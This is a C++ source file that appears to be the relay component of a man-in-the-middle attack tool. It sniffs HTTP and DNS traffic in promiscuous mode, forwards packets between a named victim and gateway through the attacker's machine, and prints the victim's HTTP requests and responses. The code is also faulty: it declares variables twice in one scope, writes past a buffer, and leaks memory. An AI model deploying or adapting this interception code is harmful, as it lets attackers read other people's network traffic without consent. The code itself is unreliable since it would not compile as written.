/*
 * Pipe.cpp
 *
 *  Created on: 10 de ago de 2015
 *      Author: rodopoulos
 */

#include "Pipe.h"

using namespace Tins;
using namespace HTTP;

PacketSender 		Pipe::sender;
TCPStreamFollower	Pipe::assembler;
int			 		Pipe::count = 1;
Server*				Pipe::server;

Pipe::Pipe() {}
Pipe::~Pipe() {}

void Pipe::init(){
	sender.default_interface(Globals::iface);
	pthread_t sniffingThread;
	if(pthread_create(&sniffingThread, nullptr, connect, nullptr) < 0){
		std::cerr << "\033[1;31m [Error]"
					 " Pipe::init ->"
					 "\033[0m can't create relay thread" << std::endl;
		exit(EXIT_FAILURE);
	}
}

void* Pipe::connect(void* args){
	std::string filter = "(tcp port 80 || udp port 53 || tcp port 53)";
	Sniffer sniffer(Globals::iface.name(), MIN_MTU, Sniffer::PROMISC);
	try{
		sniffer.set_filter(filter);
	} catch(std::runtime_error e()){
		sniffer.set_filter(filter);
	}

	std::cout << "Relay is on." << std::endl;
	assembler.gptr = new GambiarraFilha();
	assembler.follow_streams(sniffer, tcpFollower, httpRecover);

	return nullptr;
}

void GambiarraFilha::callback(PDU& packet){
	Pipe::relay(packet);
}

bool Pipe::relay(PDU& packet){
	EthernetII* ether = packet.find_pdu<EthernetII>();
	IP* ip = packet.find_pdu<IP>();

	if(ether->dst_addr() == Globals::attacker.mac){

		// Victim -> Gateway
		if(ether->src_addr() == Globals::victim.mac){
			ether->src_addr(Globals::attacker.mac);
			ether->dst_addr(Globals::gateway.mac);
			count++;
			sender.send(packet);

		// Gateway -> Victim
		} else if(ether->src_addr() == Globals::gateway.mac && ip->dst_addr() != Globals::attacker.ip){
			ether->src_addr(Globals::attacker.mac);
			ether->dst_addr(Globals::victim.mac);
			count++;
			sender.send(packet);
		}
	}

	return true;
}

bool Pipe::httpRecover(TCPStream& stream){
	std::cout << &stream.client_payload()[0] << std::endl << std::endl;
	std::cout << &stream.server_payload()[0] << std::endl << std::endl  << std::endl;
	std::cout << "****************************************************" << std::endl << std::endl;

	std::size_t size = stream.client_payload().size();
	unsigned char* buf = new unsigned char[size + 1];
	buf = reinterpret_cast<unsigned char*>(stream.client_payload().data());
	buf[size + 1] = '\0';

	Request request(buf, size + 1);
	std::cout << "\033[1;36m[REQUEST] \033[0;36m"
			  << request.method << " "
			  << request.uri << "\033[0m"
			  << std::endl;


	std::size_t size = stream.client_payload().size();
	unsigned char* buf = new unsigned char[size + 1];
	buf = reinterpret_cast<unsigned char*>(stream.server_payload().data());
	buf[size + 1] = '\0';

	Response response(buf, size + 1);
	std::cout << "\033[1;32m[RESPONSE] \033[0;32m"
			  << response.code << " "
			  << response.message << "\033[0m"
			  << std::endl;

	return true;
}


bool Pipe::tcpFollower(TCPStream& stream){
	return true;
}

void Pipe::setServer(Server *serverPtr){
	server = serverPtr;
}

void Pipe::printPacket(PDU& packet){
	if(packet.size() <= MIN_MTU)
		std::cout << "\033[0;36m[" << count << "]gateway > victim | size: " << packet.size() << "\033[0m" << std::endl;
	else
		std::cout << "\033[1;31m[" << count << "]gateway > victim | size: " << packet.size() << "\033[0m" << std::endl;
}
